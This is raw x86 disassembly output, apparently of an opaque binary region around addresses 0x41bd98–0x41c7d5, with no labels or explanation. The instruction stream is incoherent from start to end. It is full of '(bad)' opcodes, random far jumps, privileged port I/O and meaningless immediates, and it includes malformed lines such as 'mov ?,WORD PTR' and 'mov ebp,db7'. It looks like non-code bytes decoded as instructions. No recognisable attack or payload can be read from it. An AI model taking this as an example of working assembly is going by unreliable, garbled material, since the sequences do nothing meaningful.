  41bd98:	imul   ebx,DWORD PTR [esi],0x9
  41bd9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd9c:	and    DWORD PTR [edx+0x54],ebx
  41bd9f:	jne    0x41be03
  41bda1:	jns    0x41bd9b
  41bda3:	adc    al,0xd2
  41bda5:	mov    ah,0xa5
  41bda7:	jmp    0x41bda9
  41bda9:	pop    ebx
  41bdaa:	loope  0x41bd37
  41bdac:	int3   
  41bdad:	sub    DWORD PTR [ebx],edi
  41bdaf:	in     eax,dx
  41bdb0:	in     al,dx
  41bdb1:	scas   eax,DWORD PTR es:[edi]
  41bdb2:	jo     0x41bd7b
  41bdb4:	inc    eax
  41bdb5:	outs   dx,BYTE PTR ds:[esi]
  41bdb6:	loop   0x41bd41
  41bdb8:	and    al,BYTE PTR [ebp+0x3e]
  41bdbb:	xor    eax,edi
  41bdbd:	xchg   ebp,eax
  41bdbe:	mov    edi,0xce303c43
  41bdc3:	test   al,0xfd
  41bdc5:	ret    
  41bdc6:	push   edi
  41bdc7:	mov    ebx,0x66247fdf
  41bdcc:	mov    ebx,ebp
  41bdce:	cwde   
  41bdcf:	dec    ecx
  41bdd0:	sbb    eax,0x78044359
  41bdd6:	xchg   edx,eax
  41bdd7:	je     0x41be01
  41bdd9:	enter  0xd395,0x37
  41bddd:	mov    ebp,DWORD PTR [edx+0x7b]
  41bde0:	push   ebp
  41bde1:	sub    bh,BYTE PTR [eax+0x2e]
  41bde4:	adc    al,0x89
  41bde6:	fwait
  41bde7:	and    eax,0x79bf215d
  41bdec:	ins    DWORD PTR es:[edi],dx
  41bded:	sub    bh,BYTE PTR [ebp+0x57]
  41bdf0:	push   eax
  41bdf1:	popa   
  41bdf2:	cwde   
  41bdf3:	mov    ss,WORD PTR [edx+0x396dfa16]
  41bdf9:	fwait
  41bdfa:	ret    0xfd87
  41bdfd:	lds    ecx,FWORD PTR [eax]
  41bdff:	outs   dx,DWORD PTR ds:[esi]
  41be00:	jne    0x41bdbf
  41be02:	sbb    eax,0xd9ec0cac
  41be07:	cmp    eax,0x422af82
  41be0c:	push   ecx
  41be0d:	pop    ebx
  41be0e:	sbb    eax,0xdc603a69
  41be13:	or     eax,0xd095c564
  41be18:	dec    esp
  41be19:	xlat   BYTE PTR ds:[ebx]
  41be1a:	in     eax,0xc5
  41be1c:	dec    esi
  41be1d:	scas   al,BYTE PTR es:[edi]
  41be1e:	xlat   BYTE PTR ds:[ebx]
  41be1f:	lods   eax,DWORD PTR ds:[esi]
  41be20:	clc    
  41be21:	and    edi,DWORD PTR [ecx+0x1f]
  41be24:	into   
  41be25:	cs xchg edx,eax
  41be27:	loopne 0x41bdd4
  41be29:	pop    dx
  41be2b:	addr16 xchg ebx,eax
  41be2d:	push   0x4519d8f5
  41be32:	mov    dh,BYTE PTR [ecx]
  41be34:	scas   eax,DWORD PTR es:[edi]
  41be35:	jbe    0x41bdd0
  41be37:	ins    BYTE PTR es:[edi],dx
  41be38:	cmc    
  41be39:	in     al,0x26
  41be3b:	jne    0x41be5e
  41be3d:	dec    ebp
  41be3e:	aas    
  41be3f:	mov    ebp,DWORD PTR [edi+0x0]
	...
  41beb2:	add    BYTE PTR [eax],al
  41beb4:	(bad)  
  41beb7:	xor    edi,DWORD PTR [ebp-0x57002089]
  41bebd:	ja     0x41bf3b
  41bebf:	movnti DWORD PTR [esi+0x2d532179],ebx
  41bec6:	add    DWORD PTR [eax],eax
  41bec8:	cmc    
  41bec9:	add    BYTE PTR [eax],al
  41becb:	add    BYTE PTR [ebx-0x68],dh
  41bece:	es dec eax
  41bed0:	xchg   esp,eax
  41bed1:	or     DWORD PTR ds:0xfbfc70,esp
  41bed7:	and    BYTE PTR [esi+0xd],bl
  41beda:	into   
  41bedb:	and    ebx,DWORD PTR [esi]
  41bedd:	sub    BYTE PTR [esp],bl
  41bee0:	int    0xae
  41bee2:	xchg   BYTE PTR [edi+0x36],ah
  41bee5:	mov    ebx,0x6bc52eaf
  41beea:	inc    eax
  41beeb:	ror    al,1
  41beed:	std    
  41beee:	push   ecx
  41beef:	rcl    BYTE PTR [edx],0x99
  41bef2:	pop    ebx
  41bef3:	stos   BYTE PTR es:[edi],al
  41bef4:	(bad)  
  41bef5:	pop    ss
  41bef6:	push   es
  41bef7:	rcr    DWORD PTR [eax],cl
  41bef9:	cli    
  41befa:	shl    BYTE PTR [edx+0x63],1
  41befd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41befe:	sbb    DWORD PTR [edx+0x1a907301],edi
  41bf04:	xchg   DWORD PTR [edi+0x34],ebp
  41bf07:	scas   al,BYTE PTR es:[edi]
  41bf08:	mov    edi,0x275d7211
  41bf0d:	xor    eax,0x71eb9015
  41bf12:	adc    ebx,ebx
  41bf14:	pop    es
  41bf15:	jmp    0xd4f121ad
  41bf1a:	in     eax,dx
  41bf1b:	inc    ebx
  41bf1c:	scas   al,BYTE PTR es:[edi]
  41bf1d:	push   esp
  41bf1e:	adc    eax,DWORD PTR [edi+ebx*8+0x6d61c1a8]
  41bf25:	out    dx,eax
  41bf26:	mov    DWORD PTR [edx],esi
  41bf28:	std    
  41bf29:	adc    DWORD PTR [eax-0x59],eax
  41bf2c:	test   DWORD PTR [ebx+ebp*4-0x28],0x4204c3f8
  41bf34:	hlt    
  41bf35:	mov    dl,0x71
  41bf37:	fwait
  41bf38:	jmp    FWORD PTR [ecx]
  41bf3a:	repnz dec DWORD PTR [edx+0x150e0e9f]
  41bf41:	inc    edx
  41bf42:	cmp    DWORD PTR [ecx-0x43],eax
  41bf45:	sbb    bh,0x72
  41bf48:	ret    
  41bf49:	out    0xf0,eax
  41bf4b:	out    dx,al
  41bf4c:	add    eax,0xa83d687b
  41bf51:	pop    esp
  41bf52:	(bad)  
  41bf53:	mov    edi,0x4f2d3c50
  41bf58:	pop    esp
  41bf59:	dec    esi
  41bf5a:	inc    edi
  41bf5b:	sub    al,dl
  41bf5d:	mov    ecx,0x42185be6
  41bf62:	mov    bh,0x21
  41bf64:	cmp    al,0xae
  41bf66:	loope  0x41bfb4
  41bf68:	push   0xec443625
  41bf6d:	xchg   BYTE PTR [eax],ah
  41bf6f:	sbb    ecx,DWORD PTR [edx+ebp*4]
  41bf72:	jae    0x41bfab
  41bf74:	sbb    al,0x60
  41bf76:	jl     0x41bf5a
  41bf78:	dec    edx
  41bf79:	and    DWORD PTR [edx+ebp*4+0x5b],esp
  41bf7d:	mov    fs,edi
  41bf7f:	ror    BYTE PTR [edi],1
  41bf81:	retf   0xd1ee
  41bf84:	mov    bh,ah
  41bf86:	repnz dec ebp
  41bf88:	call   0x261d01b5
  41bf8d:	das    
  41bf8e:	iret   
  41bf8f:	add    bl,BYTE PTR [eax-0x7f]
  41bf92:	pop    edx
  41bf93:	and    eax,DWORD PTR [ebp+0x57]
  41bf96:	xchg   esi,eax
  41bf97:	push   esp
  41bf98:	das    
  41bf99:	popf   
  41bf9a:	inc    esp
  41bf9b:	dec    edx
  41bf9c:	adc    al,0x7e
  41bf9e:	sub    BYTE PTR [edx+eax*4+0x5c],0x86
  41bfa3:	inc    edi
  41bfa4:	pop    edx
  41bfa5:	inc    edi
  41bfa6:	mov    eax,0x8813b045
  41bfab:	(bad)  
  41bfac:	sub    al,al
  41bfae:	sar    dl,1
  41bfb0:	cmp    dh,bl
  41bfb2:	jb     0x41bf40
  41bfb4:	and    cl,BYTE PTR [esi]
  41bfb6:	and    bl,BYTE PTR [eax]
  41bfb8:	jb     0x41c017
  41bfba:	mov    ch,0xa6
  41bfbc:	ds in  al,dx
  41bfbe:	cmp    edi,DWORD PTR [esi+0x9b]
	...
  41c034:	(bad)  
  41c035:	ficom  WORD PTR [eax]
  41c037:	stos   DWORD PTR es:[edi],eax
  41c038:	sbb    bh,ch
  41c03a:	(bad)  
  41c03b:	jmp    FWORD PTR [esi+0x30bb9a81]
  41c041:	ror    edi,1
  41c043:	outs   dx,DWORD PTR ds:[esi]
  41c044:	dec    eax
  41c045:	add    DWORD PTR cs:[eax],eax
  41c048:	cmc    
  41c049:	add    BYTE PTR [eax],al
  41c04b:	add    BYTE PTR [esi+edi*4],dl
  41c04e:	inc    ebp
  41c04f:	stos   BYTE PTR es:[edi],al
  41c050:	call   0x8a033c7a
  41c055:	sahf   
  41c056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c057:	mov    BYTE PTR [eax+0x35],bh
  41c05a:	int3   
  41c05b:	mov    eax,0xc2bf45e8
  41c060:	popa   
  41c061:	cmp    ebp,esi
  41c063:	sub    DWORD PTR [edi],eax
  41c065:	xchg   BYTE PTR [ecx],cl
  41c067:	rcr    DWORD PTR [ebx],0xff
  41c06a:	into   
  41c06b:	sub    edx,DWORD PTR [eax]
  41c06d:	add    BYTE PTR [esi+0x38],ch
  41c070:	and    al,0x14
  41c072:	dec    ebx
  41c073:	jmp    0x1202373
  41c078:	popa   
  41c079:	adc    BYTE PTR [eax],dl
  41c07b:	mov    ds:0xafd34ec1,eax
  41c080:	or     BYTE PTR [edi+0x53a417e5],al
  41c086:	add    bh,BYTE PTR [edx-0x3c881c97]
  41c08c:	(bad)  
  41c08d:	mov    al,ds:0x6f937ade
  41c092:	and    esi,DWORD PTR ds:0x1dc7ccc4
  41c098:	fs inc ecx
  41c09a:	daa    
  41c09b:	pop    eax
  41c09c:	jecxz  0x41c0ed
  41c09e:	rcr    BYTE PTR ds:0x83c6a755,0x2b
  41c0a5:	ds int3 
  41c0a7:	jg     0x41c123
  41c0a9:	push   ecx
  41c0aa:	out    dx,eax
  41c0ab:	push   eax
  41c0ac:	cmp    DWORD PTR [edx+0x7c],ecx
  41c0af:	sbb    BYTE PTR [edi+0x51],0xf5
  41c0b3:	repnz push esi
  41c0b5:	inc    ecx
  41c0b6:	mov    dl,BYTE PTR [edi]
  41c0b8:	adc    ecx,esp
  41c0ba:	sub    al,0xc0
  41c0bc:	xchg   BYTE PTR [ebp+0x9],dh
  41c0bf:	dec    esp
  41c0c0:	fwait
  41c0c1:	mul    BYTE PTR [edx+0x6f]
  41c0c4:	pop    edi
  41c0c5:	inc    ecx
  41c0c6:	adc    ecx,esi
  41c0c8:	sti    
  41c0c9:	retf   0xd900
  41c0cc:	pushf  
  41c0cd:	in     al,dx
  41c0ce:	add    ebp,DWORD PTR [ecx-0x2]
  41c0d1:	and    ah,0xea
  41c0d4:	ret    
  41c0d5:	xchg   DWORD PTR [edx+0x376f2daa],ebp
  41c0db:	(bad)  
  41c0dd:	add    BYTE PTR [esi+0x334c6090],al
  41c0e3:	aaa    
  41c0e4:	inc    edi
  41c0e5:	mov    cl,0x91
  41c0e7:	mov    ebp,0xd71aa0fe
  41c0ec:	sahf   
  41c0ed:	push   edx
  41c0ee:	and    eax,DWORD PTR [ebx+0x59cb1502]
  41c0f4:	out    dx,al
  41c0f5:	jbe    0x41c15a
  41c0f7:	xchg   edx,eax
  41c0f8:	jae    0x41c129
  41c0fa:	mov    al,0xf9
  41c0fc:	xchg   ecx,eax
  41c0fd:	sbb    eax,0xad4115ac
  41c102:	jmp    0x8f2bd545
  41c107:	mov    bh,0x72
  41c109:	je     0x41c14b
  41c10b:	push   eax
  41c10c:	sti    
  41c10d:	jb     0x41c14d
  41c10f:	imul   eax,DWORD PTR [ebp+0x657214e8],0x976b013a
  41c119:	std    
  41c11a:	iret   
  41c11b:	sbb    BYTE PTR [ebp-0x47],bh
  41c11e:	sub    ebx,ecx
  41c120:	hlt    
  41c121:	out    0x3b,al
  41c123:	cwde   
  41c124:	leave  
  41c125:	xor    eax,0x14cb7a67
  41c12a:	sub    eax,0x5451cac6
  41c12f:	imul   ebx,DWORD PTR [ecx],0x7e
  41c132:	dec    edx
  41c133:	cmp    dh,BYTE PTR [eax-0x63c570b9]
  41c139:	icebp  
  41c13a:	mov    eax,ds:0x3137d28e
  41c13f:	repnz push ss
	...
  41c1b1:	add    BYTE PTR [eax],al
  41c1b3:	add    BYTE PTR [esi+0x6be069a5],cl
  41c1b9:	in     al,dx
  41c1ba:	(bad)  
  41c1bb:	out    dx,eax
  41c1bc:	sbb    BYTE PTR [edi],0x8e
  41c1bf:	sbb    eax,0x4edb3802
  41c1c4:	cmp    eax,0xf500012f
  41c1c9:	add    BYTE PTR [eax],al
  41c1cb:	add    BYTE PTR [esi-0x4c],cl
  41c1ce:	mov    ah,0xab
  41c1d0:	inc    esi
  41c1d1:	push   ebp
  41c1d2:	bound  eax,QWORD PTR [ebx+0x1409e863]
  41c1d8:	add    DWORD PTR [ebp-0x7],ecx
  41c1db:	call   0xaaa89940
  41c1e0:	jle    0x41c25f
  41c1e2:	push   edi
  41c1e3:	add    bl,cl
  41c1e5:	mov    eax,0x3dfaa26a
  41c1ea:	dec    ebp
  41c1eb:	sar    DWORD PTR [edi+0x2dab3279],cl
  41c1f1:	and    dl,BYTE PTR [eax-0x512c8f20]
  41c1f7:	mov    eax,ds:0x4db5d006
  41c1fc:	test   DWORD PTR [esi-0x46fff734],ebp
  41c202:	lock pop eax
  41c204:	sahf   
  41c205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c206:	enter  0xdc2f,0x4f
  41c20a:	in     eax,0x3
  41c20c:	xchg   edx,eax
  41c20d:	call   0x97ba:0x67ce81f6
  41c214:	push   ecx
  41c215:	push   ebx
  41c216:	in     eax,dx
  41c217:	std    
  41c218:	nop
  41c219:	sbb    BYTE PTR [edx-0x31714631],0x50
  41c220:	add    al,0x1f
  41c222:	and    eax,0xd5c05693
  41c227:	fmulp  st(4),st
  41c229:	or     eax,0xf19bc445
  41c22e:	fs push esp
  41c230:	scas   eax,DWORD PTR es:[edi]
  41c231:	add    eax,0x260fb64d
  41c236:	mov    bh,BYTE PTR [ebx+eax*1+0xf8eb8a4]
  41c23d:	push   0xb
  41c23f:	push   ds
  41c240:	mov    bl,0x9
  41c242:	pop    ebp
  41c243:	int    0xef
  41c245:	pop    ecx
  41c246:	bound  ebp,QWORD PTR [esi-0x626fb375]
  41c24c:	sub    DWORD PTR [edi+0x40],edx
  41c24f:	mov    dh,0xdc
  41c251:	dec    ecx
  41c252:	lods   eax,DWORD PTR ds:[si]
  41c254:	xor    al,0xb0
  41c256:	lock or cl,bl
  41c259:	dec    esi
  41c25a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c25b:	push   edx
  41c25c:	leave  
  41c25d:	call   0xcf4:0x6681a49d
  41c264:	out    0x17,al
  41c266:	nop
  41c267:	pop    ss
  41c268:	or     ah,BYTE PTR [edx-0x29324d1c]
  41c26e:	jmp    0x41c285
  41c270:	mov    DWORD PTR [ecx+0x7b],edx
  41c273:	adc    edx,DWORD PTR [edi+0x4a14215e]
  41c279:	popa   
  41c27a:	sub    edi,DWORD PTR ds:0x2aa4caa2
  41c280:	hlt    
  41c281:	cmp    eax,0xa3441e0f
  41c286:	js     0x41c21d
  41c288:	sbb    al,0x8f
  41c28a:	hlt    
  41c28b:	push   edx
  41c28c:	jb     0x41c266
  41c28e:	ins    BYTE PTR es:[edi],dx
  41c28f:	fwait
  41c290:	shl    DWORD PTR [ebp+0x4a70e0dc],0xd3
  41c297:	dec    edx
  41c298:	sbb    ebx,esp
  41c29a:	jo     0x41c317
  41c29c:	and    ah,bl
  41c29e:	or     eax,0x8fc0cf6a
  41c2a3:	cmp    BYTE PTR [edx-0x2f7bb3cd],cl
  41c2a9:	xchg   edx,eax
  41c2aa:	push   eax
  41c2ab:	ret    0x45e5
  41c2ae:	xchg   DWORD PTR [ebx+0x29560783],ebp
  41c2b4:	mov    ebx,0xb6fb2e04
  41c2b9:	hlt    
  41c2ba:	jl     0x41c320
  41c2bc:	xor    ch,BYTE PTR [edi-0x75]
  41c2bf:	bound  edx,QWORD PTR [ecx]
	...
  41c331:	add    BYTE PTR [eax],al
  41c333:	add    BYTE PTR [eax+0xd],cl
  41c336:	sbb    eax,0xfebb5dab
  41c33b:	out    dx,eax
  41c33c:	aad    0x1f
  41c33e:	jo     0x41c35e
  41c340:	(bad)  
  41c341:	retf   0xf0fe
  41c344:	xor    dh,BYTE PTR [eax]
  41c346:	add    DWORD PTR [eax],eax
  41c348:	cmc    
  41c349:	add    BYTE PTR [eax],al
  41c34b:	add    BYTE PTR [ecx+0x1a],dh
  41c34e:	xor    ebx,DWORD PTR [esi+ebp*2]
  41c351:	stos   BYTE PTR es:[edi],al
  41c352:	dec    ebp
  41c353:	outs   dx,DWORD PTR ds:[esi]
  41c354:	fsub   st,st(2)
  41c356:	pop    eax
  41c357:	dec    edi
  41c358:	pop    edi
  41c359:	shr    BYTE PTR [ecx-0x58],cl
  41c35c:	(bad)  
  41c35d:	mov    BYTE PTR [edx],bh
  41c35f:	hlt    
  41c360:	dec    edx
  41c361:	push   ebx
  41c362:	daa    
  41c363:	push   cs
  41c364:	mov    ds:0x744fa23f,eax
  41c369:	push   cs
  41c36a:	xlat   BYTE PTR ds:[ebx]
  41c36b:	and    esp,DWORD PTR [ecx-0x12]
  41c36e:	jmp    0x41c35c
  41c370:	dec    eax
  41c371:	js     0x41c309
  41c373:	sub    al,ch
  41c375:	fild   WORD PTR [ebp-0x6b1a9a70]
  41c37b:	pop    eax
  41c37c:	adc    DWORD PTR [eax-0x78],ecx
  41c37f:	jecxz  0x41c385
  41c381:	mov    dh,0xd1
  41c383:	adc    cl,BYTE PTR [ebx]
  41c385:	std    
  41c386:	dec    esp
  41c387:	imul   eax,DWORD PTR [ebx-0x6437a7d0],0xca4ce75a
  41c391:	ins    BYTE PTR es:[edi],dx
  41c392:	add    al,BYTE PTR [esp+esi*4]
  41c395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c396:	sbb    BYTE PTR [ebp+0x4d],bh
  41c399:	jno    0x41c3da
  41c39b:	pushf  
  41c39c:	bound  eax,QWORD PTR [ecx+eax*1+0x55]
  41c3a0:	das    
  41c3a1:	ja     0x41c3fa
  41c3a3:	aam    0x44
  41c3a5:	mov    dh,0x2a
  41c3a7:	mov    esp,0x5b0379f9
  41c3ac:	xor    eax,DWORD PTR [edi-0x7d]
  41c3af:	pop    ebx
  41c3b0:	popf   
  41c3b1:	int3   
  41c3b2:	push   eax
  41c3b3:	and    eax,0xc3d534f0
  41c3b8:	mov    ah,0x34
  41c3ba:	dec    edx
  41c3bb:	sub    BYTE PTR [edx+0x4c0d6075],0x3c
  41c3c2:	pop    eax
  41c3c3:	add    eax,0x116c9b37
  41c3c8:	mov    al,ds:0xfcdcd910
  41c3cd:	sahf   
  41c3ce:	adc    al,0xe9
  41c3d0:	rcl    BYTE PTR [ecx+ebp*8],0x36
  41c3d4:	shr    cl,0xd2
  41c3d7:	adc    DWORD PTR [ecx],esi
  41c3d9:	scas   eax,DWORD PTR es:[edi]
  41c3da:	stos   BYTE PTR es:[edi],al
  41c3db:	pop    esi
  41c3dc:	pop    ss
  41c3dd:	retf   0x5f2d
  41c3e0:	pop    edi
  41c3e1:	pop    eax
  41c3e2:	xchg   DWORD PTR ds:0x2e235979,ebx
  41c3e8:	pop    edx
  41c3e9:	sbb    eax,0x39a07880
  41c3ee:	ret    
  41c3ef:	mov    ebp,0xc6049345
  41c3f4:	int3   
  41c3f5:	test   BYTE PTR [edx+eax*4-0xc6b5aef],bl
  41c3fc:	sbb    BYTE PTR [eax],cl
  41c3fe:	push   ebx
  41c3ff:	icebp  
  41c400:	repnz lods al,BYTE PTR ds:[esi]
  41c402:	xchg   BYTE PTR [ebx+esi*1+0x281d7433],ah
  41c409:	add    bl,BYTE PTR [edx-0x73]
  41c40c:	inc    eax
  41c40d:	jns    0x41c43e
  41c40f:	stc    
  41c410:	cmp    al,0x4c
  41c412:	dec    al
  41c414:	(bad)  
  41c415:	fucomi st,st(5)
  41c417:	in     eax,0x33
  41c419:	jmp    0x41c3c5
  41c41b:	pusha  
  41c41c:	or     eax,0xaf7d913c
  41c421:	push   cs
  41c422:	arpl   WORD PTR [edi+0x726d81ca],di
  41c428:	push   0xb5bb9efc
  41c42d:	rcr    DWORD PTR [ebp-0x5acbac22],1
  41c433:	test   al,0xdf
  41c435:	cmp    ebp,DWORD PTR [ebp-0x49]
  41c438:	inc    esi
  41c439:	pop    ecx
  41c43a:	das    
  41c43b:	ins    DWORD PTR es:[edi],dx
  41c43c:	or     esp,esp
  41c43e:	fisttp QWORD PTR [edi+0x70]
	...
  41c4b4:	aam    0xec
  41c4b6:	add    edi,edi
  41c4b8:	cmp    edi,edi
  41c4ba:	(bad)  
  41c4bb:	out    dx,eax
  41c4bc:	dec    edi
  41c4bd:	retf   
  41c4be:	fstp   TBYTE PTR [ebx+0x3212a609]
  41c4c4:	daa    
  41c4c5:	xor    DWORD PTR [ecx],eax
  41c4c7:	add    ch,dh
  41c4c9:	add    BYTE PTR [eax],al
  41c4cb:	add    cl,ch
  41c4cd:	pop    ds
  41c4ce:	gs xor al,0x4f
  41c4d1:	cmp    bl,BYTE PTR [eax]
  41c4d3:	lods   eax,DWORD PTR ds:[esi]
  41c4d4:	mov    edi,0x6943cb24
  41c4d9:	int    0xe2
  41c4db:	outs   dx,DWORD PTR ds:[esi]
  41c4dc:	stos   BYTE PTR es:[edi],al
  41c4dd:	idiv   BYTE PTR [ecx+0xc]
  41c4e0:	cld    
  41c4e1:	icebp  
  41c4e2:	cmp    al,0x22
  41c4e4:	xchg   esp,eax
  41c4e5:	and    edx,DWORD PTR [edx+0x5b9a9b12]
  41c4eb:	mov    DWORD PTR [esi+0x66],ebx
  41c4ee:	dec    ebx
  41c4ef:	sub    BYTE PTR [ecx-0x6af3abca],bl
  41c4f5:	cmp    eax,0x46b9895a
  41c4fa:	cs add al,0xc0
  41c4fd:	mov    edx,0x8191bc6d
  41c502:	iret   
  41c503:	fs cmp ah,bh
  41c506:	sbb    edx,eax
  41c508:	cmp    ebp,esi
  41c50a:	cld    
  41c50b:	jae    0x41c4ad
  41c50d:	inc    edx
  41c50e:	dec    ebx
  41c50f:	or     ecx,DWORD PTR [edx-0x56105bf8]
  41c515:	pop    ds
  41c516:	and    bl,BYTE PTR [ebx-0x2f]
  41c519:	fldcw  WORD PTR [edx-0x1d]
  41c51c:	aam    0x7a
  41c51e:	sbb    esp,DWORD PTR [esi]
  41c520:	push   cs
  41c521:	gs pop ds
  41c523:	dec    ecx
  41c524:	icebp  
  41c525:	dec    eax
  41c526:	cmp    ecx,eax
  41c528:	das    
  41c529:	repz add BYTE PTR [edx+0x3c],ah
  41c52d:	lods   eax,DWORD PTR gs:[esi]
  41c52f:	stc    
  41c530:	fidiv  WORD PTR [eax]
  41c532:	(bad)  
  41c534:	outs   dx,DWORD PTR ds:[esi]
  41c535:	xor    al,0x47
  41c537:	pop    ds
  41c538:	inc    esp
  41c539:	rcl    BYTE PTR [ecx+0x16],1
  41c53c:	aas    
  41c53d:	cmc    
  41c53e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c53f:	pop    esi
  41c540:	cmp    edx,DWORD PTR [eax-0x3a]
  41c543:	inc    esp
  41c544:	sbb    dl,bh
  41c546:	xchg   BYTE PTR [edx-0xe],ch
  41c549:	es dec esi
  41c54b:	sbb    BYTE PTR [eax+0x274157b4],0xb7
  41c552:	js     0x41c54b
  41c554:	scas   al,BYTE PTR es:[edi]
  41c555:	enter  0xe8d6,0x8b
  41c559:	popf   
  41c55a:	ins    BYTE PTR es:[edi],dx
  41c55b:	pop    ecx
  41c55c:	pop    es
  41c55d:	pop    ds
  41c55e:	sbb    ebp,DWORD PTR [eax+0x4f]
  41c561:	nop
  41c562:	iret   
  41c563:	add    BYTE PTR [ebp+0x1bd6b176],bl
  41c569:	push   cs
  41c56a:	mov    dh,0x68
  41c56c:	fisttp QWORD PTR [edi+0x604f8f33]
  41c572:	js     0x41c4fa
  41c574:	fmul   st(6),st
  41c576:	sbb    DWORD PTR [esi-0x20],esp
  41c579:	jge    0x41c5e3
  41c57b:	mov    ebp,0x3a75106e
  41c580:	fisubr DWORD PTR [eax-0xd4dcef3]
  41c586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c587:	push   ebp
  41c588:	mov    eax,0x8668995
  41c58d:	retf   0xecd5
  41c590:	stos   BYTE PTR es:[edi],al
  41c591:	icebp  
  41c592:	adc    eax,0xced32f1d
  41c597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c598:	imul   edi,DWORD PTR [ecx],0xe5cd2721
  41c59e:	hlt    
  41c59f:	ss inc esi
  41c5a1:	test   al,0xca
  41c5a3:	leave  
  41c5a4:	(bad)  
  41c5a5:	jle    0x41c558
  41c5a7:	mov    DWORD PTR [edx+eiz*2],ebx
  41c5aa:	les    esp,FWORD PTR [esi+0x56ec1a0b]
  41c5b0:	ins    DWORD PTR es:[edi],dx
  41c5b1:	push   ss
  41c5b2:	into   
  41c5b3:	and    eax,0x34370413
  41c5b8:	mov    al,ds:0x77a33e2d
  41c5bd:	jge    0x41c5d2
  41c5bf:	into   
  41c5c0:	sbb    DWORD PTR [eax],eax
	...
  41c632:	add    BYTE PTR [eax],al
  41c634:	test   al,0x63
  41c636:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41c63c:	out    dx,eax
  41c63d:	add    al,0x38
  41c63f:	lods   al,BYTE PTR ds:[esi]
  41c640:	mov    esp,0x1c63e1e0
  41c645:	xor    al,BYTE PTR [ecx]
  41c647:	add    ch,dh
  41c649:	add    BYTE PTR [eax],al
  41c64b:	add    al,al
  41c64d:	xchg   esi,eax
  41c64e:	dec    edi
  41c64f:	or     al,BYTE PTR [ebp-0x1e9b8654]
  41c655:	and    eax,0x2c537ed3
  41c65a:	jnp    0x41c5ee
  41c65c:	dec    edi
  41c65d:	retf   0x1887
  41c660:	(bad)
  41c663:	inc    ecx
  41c664:	push   0x5f
  41c666:	nop
  41c667:	sbb    edi,esi
  41c669:	mov    ?,WORD PTR [eax+0x7db6f0c8]
  41c66f:	aas    
  41c670:	je     0x41c65f
  41c672:	xor    esp,esi
  41c674:	fs pop ecx
  41c676:	and    BYTE PTR [edi-0x6d36f92e],0x66
  41c67d:	bound  esp,QWORD PTR [ebx]
  41c67f:	push   ebp
  41c680:	mov    ebx,0x93114c96
  41c685:	jmp    0xdd432cee
  41c68a:	gs cmp dh,0x7a
  41c68e:	pusha  
  41c68f:	jmp    0x41c63e
  41c691:	pop    esi
  41c692:	nop
  41c693:	mov    edx,0x40a9cdc5
  41c698:	loopne 0x41c6f5
  41c69a:	push   ds
  41c69b:	pusha  
  41c69c:	stc    
  41c69d:	pop    ebx
  41c69e:	out    0x12,eax
  41c6a0:	les    ebx,FWORD PTR [esi]
  41c6a2:	cmp    cl,cl
  41c6a4:	jl     0x41c6ac
  41c6a6:	mov    edx,0x944bff9d
  41c6ab:	rol    ebp,cl
  41c6ad:	mov    al,0xaa
  41c6af:	leave  
  41c6b0:	dec    edx
  41c6b1:	sbb    DWORD PTR [eax],esi
  41c6b3:	inc    ebx
  41c6b4:	inc    edi
  41c6b5:	test   eax,0xe738ef20
  41c6ba:	jl     0x41c70e
  41c6bc:	mov    ebx,0x8e88fe04
  41c6c1:	ins    DWORD PTR es:[edi],dx
  41c6c2:	jecxz  0x41c71c
  41c6c4:	xor    ecx,DWORD PTR [edi+0x1d62348c]
  41c6ca:	sbb    BYTE PTR [edx+0x1f],bl
  41c6cd:	jg     0x41c747
  41c6cf:	or     eax,0xadeba6ec
  41c6d4:	test   eax,0x3af62452
  41c6d9:	dec    edx
  41c6da:	outs   dx,BYTE PTR ds:[esi]
  41c6db:	(bad)  
  41c6dc:	jmp    0x41c6fc
  41c6de:	and    DWORD PTR ds:0x2411b928,ecx
  41c6e4:	(bad)  
  41c6e5:	imul   esp,edx,0x7
  41c6e8:	aad    0xeb
  41c6ea:	das    
  41c6eb:	repnz pushf 
  41c6ed:	push   0xbb4324c9
  41c6f2:	lods   al,BYTE PTR ds:[esi]
  41c6f3:	jecxz  0x41c737
  41c6f5:	ins    BYTE PTR es:[edi],dx
  41c6f6:	cmc    
  41c6f7:	in     eax,0x12
  41c6f9:	fdiv   st,st(3)
  41c6fb:	aam    0xe
  41c6fd:	lahf   
  41c6fe:	pop    esi
  41c6ff:	lods   eax,DWORD PTR ds:[esi]
  41c700:	mov    edi,0xea08e097
  41c705:	mov    edx,ebx
  41c707:	mov    eax,ds:0xde178cfc
  41c70c:	dec    edi
  41c70d:	pop    esp
  41c70e:	mov    ch,0x17
  41c710:	dec    eax
  41c711:	enter  0x776,0xd
  41c715:	push   esp
  41c716:	push   cs
  41c717:	mov    al,ds:0x9d9c530a
  41c71c:	es push 0x8d6d15f
  41c722:	sub    eax,0x3391159f
  41c727:	jmp    0xbf96:0x52aa5a2c
  41c72e:	push   ds
  41c72f:	(bad)  
  41c730:	mov    ds:0xb66bc828,al
  41c735:	aaa    
  41c736:	push   ecx
  41c737:	clc    
  41c738:	dec    esp
  41c739:	outs   dx,BYTE PTR ds:[esi]
  41c73a:	cmc    
  41c73b:	mov    bl,0x2a
  41c73d:	popa   
  41c73e:	mov    esi,DWORD PTR [ebx]
  41c740:	stos   BYTE PTR es:[edi],al
	...
  41c7b1:	add    BYTE PTR [eax],al
  41c7b3:	add    BYTE PTR [edx-0x8b13804],cl
  41c7b9:	jg     0x41c746
  41c7bb:	cld    
  41c7bc:	add    edi,esp
  41c7be:	adc    eax,0x8c3cf454
  41c7c3:	mov    WORD PTR [ecx],ss
  41c7c5:	xor    eax,DWORD PTR [ecx]
  41c7c7:	add    ch,dh
  41c7c9:	add    BYTE PTR [eax],al
  41c7cb:	add    BYTE PTR [ebx+0x11],dh
  41c7ce:	fisttp DWORD PTR [edx+eax*2]
  41c7d1:	stc    
  41c7d2:	mov    ebp,db7
  41c7d5:	out    dx,eax
